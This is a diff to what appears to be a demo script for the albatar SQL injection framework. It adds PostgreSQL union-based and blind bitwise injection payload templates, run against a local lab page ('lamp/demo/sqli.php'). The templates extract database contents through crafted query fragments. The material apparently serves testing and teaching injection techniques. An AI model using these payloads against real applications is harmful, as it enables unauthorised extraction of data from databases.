@@ -3,7 +3,7 @@
 from albatar import *
 import re
 
-PROXIES = {}#'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+PROXIES = {}#'http': 'http://127.0.0.1:8008', 'https': 'http://127.0.0.1:8008'}
 HEADERS = ['User-Agent: Mozilla/5.0']
 
 def test_state_grep(headers, body, time):
@@ -268,6 +268,41 @@ def oracle_boolean():
 
 # }}}
 
+# Postgres {{{
+def postgres_union():
+  '''
+  # select * from anime where id=0 union all select null,concat(
+  '''
+  template = " union all select null,':ABC:'||X||':ABC:' from ${query} -- "
+
+  def make_requester():
+    return Requester_HTTP(
+      proxies = PROXIES,
+      headers = HEADERS,
+      url = 'http://lamp/demo/sqli.php?dbms=postgres&id=0${injection}',
+      method = 'GET',
+      response_processor = extract_results,
+      )
+
+  return Method_union(make_requester, template, pager=5)
+
+def postgres_boolean():
+
+  def make_requester():
+    return Requester_HTTP(
+      proxies = PROXIES,
+      headers = HEADERS,
+      url = 'http://lamp/demo/sqli.php?dbms=postgres',
+      body = 'id=1${injection}',
+      method = 'POST',
+      response_processor = test_state_grep,
+      )
+
+  template = ' and (ascii(substring((${query})::text,${char_pos},1))&${bit_mask})=${bit_mask}'
+  return Method_bitwise(make_requester, template)
+
+# }}}
+
 sqli = MySQL_Inband(mysql_union())
 #sqli = MySQL_Inband(mysql_error())
 #sqli = MySQL_Blind(mysql_boolean_bitwise())
@@ -283,6 +318,9 @@ sqli = MySQL_Inband(mysql_union())
 #sqli = Oracle_Inband(oracle_union())
 ##sqli = Oracle_Inband(oracle_error())
 #sqli = Oracle_Blind(oracle_boolean())
+
+#sqli = Postgres_Inband(postgres_union())
+#sqli = Postgres_Blind(postgres_boolean())
 
 for r in sqli.exploit():
   print(r)
